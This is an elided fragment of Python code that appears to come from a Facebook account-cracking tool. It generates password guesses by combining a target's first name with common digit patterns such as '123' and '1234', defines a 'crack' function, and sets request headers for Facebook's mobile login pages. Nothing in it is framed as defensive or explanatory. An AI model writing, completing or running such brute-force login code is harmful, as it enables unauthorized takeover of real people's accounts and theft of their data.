        ...
        for yuzong in id2:
            ...
            if len(nmf)<6:
                if len(frs)<3:
                    ...
                    pwv.append(frs+frs+frs+'11')
                    pwv.append(frs+frs+frs+'123')
                    pwv.append(frs+frs+frs+'1234')
                    pwv.append(frs+frs+frs+'12345')
                    pwv.append('123'+frs+frs)
                    pwv.append('1234'+frs+frs)
                    pwv.append('1235'+frs+frs)
                    pwv.append(frs+'11'+frs)
                    pwv.append(frs+'12'+frs)
                    pwv.append(frs+'111'+frs)
...
def crack(idf,pwv):
   ...
   "scheme": 'https', 
    ...
    'dpr': '2.75',
    'referer': 'https://mbasic.facebook.com/login/save-device/?login_source=login&wtsid=rdr_1jIf5QECsXdkucz1S&refsrc=deprecated&_rdr',
